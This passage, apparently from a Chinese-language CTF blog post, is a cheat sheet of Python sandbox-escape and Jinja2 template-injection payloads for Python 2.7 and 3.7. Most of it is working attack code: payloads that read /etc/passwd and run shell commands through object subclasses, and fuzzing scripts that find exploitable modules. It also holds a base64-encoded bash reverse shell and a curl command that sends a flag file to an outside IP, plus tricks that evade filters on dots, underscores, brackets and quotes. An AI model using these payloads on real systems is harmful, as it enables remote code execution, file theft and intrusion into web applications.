&#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;posix.stat_result&#39;&gt;, &lt;type &#39;posix.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;urlparse.ResultMixin&#39;&gt;, &lt;type &#39;collections.deque&#39;&gt;, &lt;type &#39;deque_iterator&#39;&gt;, &lt;type &#39;deque_reverse_iterator&#39;&gt;, &lt;type &#39;operator.itemgetter&#39;&gt;, &lt;type &#39;operator.attrgetter&#39;&gt;, &lt;type &#39;operator.methodcaller&#39;&gt;, &lt;type &#39;itertools.combinations&#39;&gt;, &lt;type &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;type &#39;itertools.cycle&#39;&gt;, &lt;type &#39;itertools.dropwhile&#39;&gt;, &lt;type &#39;itertools.takewhile&#39;&gt;, &lt;type &#39;itertools.islice&#39;&gt;, &lt;type &#39;itertools.starmap&#39;&gt;, &lt;type &#39;itertools.imap&#39;&gt;, &lt;type &#39;itertools.chain&#39;&gt;, &lt;type &#39;itertools.compress&#39;&gt;, &lt;type &#39;itertools.ifilter&#39;&gt;, &lt;type &#39;itertools.ifilterfalse&#39;&gt;, &lt;type &#39;itertools.count&#39;&gt;, &lt;type &#39;itertools.izip&#39;&gt;, &lt;type &#39;itertools.izip_longest&#39;&gt;, &lt;type &#39;itertools.permutations&#39;&gt;, &lt;type &#39;itertools.product&#39;&gt;, &lt;type &#39;itertools.repeat&#39;&gt;, &lt;type &#39;itertools.groupby&#39;&gt;, &lt;type &#39;itertools.tee_dataobject&#39;&gt;, &lt;type &#39;itertools.tee&#39;&gt;, &lt;type &#39;itertools._grouper&#39;&gt;, &lt;type &#39;_thread._localdummy&#39;&gt;, &lt;type &#39;thread._local&#39;&gt;, &lt;type &#39;thread.lock&#39;&gt;, &lt;class &#39;string.Template&#39;&gt;, &lt;class &#39;string.Formatter&#39;&gt;, &lt;type &#39;_io._IOBase&#39;&gt;, &lt;type &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;type &#39;_hashlib.HASH&#39;&gt;, &lt;type &#39;_random.Random&#39;&gt;, &lt;type &#39;cStringIO.StringO&#39;&gt;, &lt;type &#39;cStringIO.StringI&#39;&gt;, &lt;type &#39;time.struct_time&#39;&gt;] 4、文件读取 Payload 1 发现40的地方存在 &lt;type &#39;file&#39;&gt; 12&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()request.__class__.__mro__[1].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() 查下标 1[().__class__.__bases__[0].__subclasses__()[i].__name__ for i in range(len(().__class__.__bases__[0].__subclasses__()))].index(&#39;file&#39;) 1234567#!/usr/bin/env python# encoding: utf-8num = 0for item in ''.__class__.__mro__[2].__subclasses__(): print num print item num+=1 Payload 2 1259&lt;class &#39;warnings.catch_warnings&#39;&gt; 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() 5、命令执行 寻找包含os模块的脚本 1234567891011#!/usr/bin/env python# encoding: utf-8num = 0for item in ''.__class__.__mro__[-1].__subclasses__(): try: if 'os' in item.__init__.__globals__: print num,item num+=1 except: print '-' num+=1 得到 12345671 &lt;class &#39;site._Printer&#39;&gt;----76 &lt;class &#39;site.Quitter&#39;&gt; 前面已经找到了包含os模块的类，先初始化，再引用即可 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) 只不过命令执行没有回显，需要反弹shell或者利用curl带出 反弹shell 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNzguMS4yMDQvMTIzNCAwPiYxCg&#x3D;&#x3D;|base64 -d|bash&#39;) curl带出 1&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;data&#x3D;$(cat &#x2F;fffffflag | base64);curl http:&#x2F;&#x2F;117.78.1.204&#x2F;?data&#x3D;$data;&#39;) catch_warnings也可以进一步构造来执行命令 1259&lt;class &#39;warnings.catch_warnings&#39;&gt; 先介绍两个属性，已知函数名可获取函数信息 1234567891011def fun(x&#x3D;1): # nothing here a&#x3D;x*2 flag&#x3D;&#39;neko&#39; return aprint fun.func_code.co_constsprint fun.func_globals&#x3D;&gt;(None, 2, &#39;neko&#39;)&#123;&#39;__builtins__&#39;: &lt;module &#39;__builtin__&#39; (built-in)&gt;, &#39;__file__&#39;: &#39;b.py&#39;, &#39;__package__&#39;: None, &#39;fun&#39;: &lt;function fun at 0x7f1b9317e750&gt;, &#39;__name__&#39;: &#39;__main__&#39;, &#39;__doc__&#39;: None&#125; 可构造 1[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&quot;linecache&quot;].__dict__[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;) 还有几种变形 1234567891011__import__(&quot;o&quot;+&quot;s&quot;).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&quot;l&quot;+&quot;s&quot;)__builtins__.__dict__[&#39;X19pbXBvcnRfXw&#x3D;&#x3D;&#39;.decode(&#39;base64&#39;)](&#39;b3M&#x3D;&#39;.decode(&#39;base64&#39;)).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&#39;l&#39;+&#39;s&#39;)[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;)[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__.values()[12].system(&#39;ls&#39;)[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system(&#39;ls&#39;)&#123;(lambda getthem&#x3D;([x for x in ().__class__.__base__.__subclasses__() if x.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;][0]()._module.__builtins__):getthem[&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;))()&#125; Python3Python 3.7.5 1、获取类对象 123456&gt;&gt;&gt; &#39;&#39;.__class__&lt;class &#39;str&#39;&gt;&gt;&gt;&gt; ().__class__&lt;class &#39;tuple&#39;&gt;&gt;&gt;&gt; [].__class__&lt;class &#39;list&#39;&gt; 2、寻找基类object 1234567&gt;&gt;&gt; &#39;&#39;.__class__.__mro__(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)&gt;&gt;&gt; [].__class__.__mro__(&lt;class &#39;list&#39;&gt;, &lt;class &#39;object&#39;&gt;)&gt;&gt;&gt; [].__class__.__base__&lt;class &#39;object&#39;&gt; 3、寻找可用的引用 12&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[-1].__subclasses__()[&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;hamt&#39;&gt;, &lt;class &#39;hamt_array_node&#39;&gt;, &lt;class &#39;hamt_bitmap_node&#39;&gt;, &lt;class &#39;hamt_collision_node&#39;&gt;, &lt;class &#39;keys&#39;&gt;, &lt;class &#39;values&#39;&gt;, &lt;class &#39;items&#39;&gt;, &lt;class &#39;Context&#39;&gt;, &lt;class &#39;ContextVar&#39;&gt;, &lt;class &#39;Token&#39;&gt;, &lt;class &#39;Token.MISSING&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;zipimport.zipimporter&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_abc_data&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;, &lt;class &#39;types.DynamicClassAttribute&#39;&gt;, &lt;class &#39;types._GeneratorWrapper&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;importlib.abc.Finder&#39;&gt;, &lt;class &#39;importlib.abc.Loader&#39;&gt;, &lt;class &#39;importlib.abc.ResourceReader&#39;&gt;, &lt;class &#39;operator.itemgetter&#39;&gt;, &lt;class &#39;operator.attrgetter&#39;&gt;, &lt;class &#39;operator.methodcaller&#39;&gt;, &lt;class &#39;itertools.accumulate&#39;&gt;, &lt;class &#39;itertools.combinations&#39;&gt;, &lt;class &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;class &#39;itertools.cycle&#39;&gt;, &lt;class &#39;itertools.dropwhile&#39;&gt;, &lt;class &#39;itertools.takewhile&#39;&gt;, &lt;class &#39;itertools.islice&#39;&gt;, &lt;class &#39;itertools.starmap&#39;&gt;, &lt;class &#39;itertools.chain&#39;&gt;, &lt;class &#39;itertools.compress&#39;&gt;, &lt;class &#39;itertools.filterfalse&#39;&gt;, &lt;class &#39;itertools.count&#39;&gt;, &lt;class &#39;itertools.zip_longest&#39;&gt;, &lt;class &#39;itertools.permutations&#39;&gt;, &lt;class &#39;itertools.product&#39;&gt;, &lt;class &#39;itertools.repeat&#39;&gt;, &lt;class &#39;itertools.groupby&#39;&gt;, &lt;class &#39;itertools._grouper&#39;&gt;, &lt;class &#39;itertools._tee&#39;&gt;, &lt;class &#39;itertools._tee_dataobject&#39;&gt;, &lt;class &#39;reprlib.Repr&#39;&gt;, &lt;class &#39;collections.deque&#39;&gt;, &lt;class &#39;_collections._deque_iterator&#39;&gt;, &lt;class &#39;_collections._deque_reverse_iterator&#39;&gt;, &lt;class &#39;collections._Link&#39;&gt;, &lt;class &#39;functools.partial&#39;&gt;, &lt;class &#39;functools._lru_cache_wrapper&#39;&gt;, &lt;class &#39;functools.partialmethod&#39;&gt;, &lt;class &#39;contextlib.ContextDecorator&#39;&gt;, &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt;, &lt;class &#39;contextlib._BaseExitStack&#39;&gt;, &lt;class &#39;rlcompleter.Completer&#39;&gt;] 4、文件读取/命令执行 3个本地测试成功的payload 123().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;) 12345693&lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;127&lt;class &#39;os._wrap_close&#39;&gt;-1&lt;class &#39;rlcompleter.Completer&#39;&gt; 通过观察，其实就是__global__中存在sys或者system或者__builtins__模块 FUZZ脚本 1234567891011121314#!/usr/bin/env python# encoding: utf-8for item in ().__class__.__bases__[0].__subclasses__(): try: if 'system' in item.__init__.__globals__: print('system',num,item) if 'sys' in item.__init__.__globals__: print('sys',num,item) if '__builtins__' in item.__init__.__globals__: print('__builtins__',num,item) num+=1 except: print '-' num+=1 fuzz出很多其他的，测试一下 尝试自己构造for循环 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if &#39;sys&#39; in c.__init__.__globals__ %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 一个0代表执行一次🤦‍♂️，命令执行的结果无法回显，利用curl带出 当然也可以指定模块名，就可以只执行一次，比如前面FUZZ出来的 1sys 128 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; 注意是后半部分Quitter 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Quitter&#39; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 上面三个模块中__builtins__最为丰富 12345[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() 比如还有chr()函数 Jinja2的for循环处理 123&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; eval执行的好处是直接有回显， Some Tricks（测试环境为Py2）.被过滤 1[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;) 使用getattr() 123456[].__class__ &#x3D;&gt; getattr([],&#39;__class__&#39;)[].__class__.__base__ &#x3D;&gt; getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;)[].__class__.__base__.__subclasses__()[59] &#x3D;&gt; getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59][].__class__.__base__.__subclasses__()[59].__init__ &#x3D;&gt; getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;)...getattr(getattr(getattr(getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;),&#39;__globals__&#39;)[&#39;linecache&#39;],&#39;__dict__&#39;)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;) _被过滤 1getattr(getattr(getattr(getattr(getattr(getattr(getattr([],dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;base&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;subclasses&#39;+dir(0)[0][0]*2)()[59],dir(0)[0][0]*2+&#39;init&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;globals&#39;+dir(0)[0][0]*2)[&#39;linecache&#39;],dir(0)[0][0]*2+&#39;dict&#39;+dir(0)[0][0]*2)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;) 中括号被过滤 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() 可以用getitem和pop进行绕过过滤 1&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(58).__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() 引号被过滤 先获取chr()再将文件名拼接 1&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125; 过滤双括号)) 利用文件盲注 1&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;aa&#39;).read()[0:1]&#x3D;&#x3D;&#39;f&#39; %&#125;~ok~&#123;% endif %&#125; 写个脚本即可 总结通用的payload 基类 12&#39;&#39;.__class__.__mro__[-1]().__class__.__base__ Python 2.7 &lt;type &#39;file&#39;&gt; 下标一般是40，如果不行的话也可爆破试试 1&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() os、__builtins__、linecache模块 寻找相应模块.py 12345678910111213#!/usr/bin/env python#coding=utf-8num = 0list = ['os', '__builtins__', 'linecache']for item in ''.__class__.__mro__[-1].__subclasses__(): try: for i in list: if i in item.__init__.__globals__: print(i, num, item) num += 1 except: print('-') num += 1 123&#39;&#39;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#39;&#39;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].os.system(&#39;ls&#39;)&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) 这里有很多变形可以参考上面的 jinja2的for循环一把梭 12345&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Quitter&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;linecache&#39;].os.system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; Python 3.7 sys、system、__builtins__模块，其中__builtins__和python2的略有不同 寻找相应模块.py 12345678910111213#!/usr/bin/env python#coding=utf-8num = 0list = ['sys', '__builtins__', 'system']for item in ''.__class__.__mro__[-1].__subclasses__(): try: for i in list: if i in item.__init__.__globals__: print(i, num, item) num += 1 except: print('-') num += 1 123&#39;&#39;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#39;&#39;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)&#39;&#39;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;) jinja2的for循环一把梭 12345&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;system&#39;](&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; ======================分割线 安恒杯抗疫月赛 没打比赛，似乎是过滤了.和_， 我想到的payload 1getattr(getattr(getattr(getattr(getattr(&#39;&#39;,dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;mro&#39;+dir(0)[0][0]*2)[-1],dir(0)[0][0]*2+&#39;subclasses&#39;+dir(0)[0][0]*2)()[127],dir(0)[0][0]*2+&#39;init&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;globals&#39;+dir(0)[0][0]*2)[&#39;system&#39;](&#39;ls&#39;) 赛后看到下面两个payload payload1，利用转义字符（16进制） http://python-ds.com/python-3-escape-sequences 1&#123;&#123;&quot;&quot;[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5f\\x5fmro\\x5f\\x5f&quot;][1][&quot;\\x5f\\x5fsubclasses\\x5f\\x5f&quot;]()[30][&quot;\\x5f\\x5finit\\x5f\\x5f&quot;][&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;][&quot;\\x5f\\x5fbuiltins\\x5f\\x5f&quot;][&#39;\\x5f\\x5fimport\\x5f\\x5f&#39;](&#39;os&#39;)[&quot;popen&quot;](&#39;cat%20&#x2F;flag*&#39;)[&#39;read&#39;]()&#125;&#125; payload2，利用request 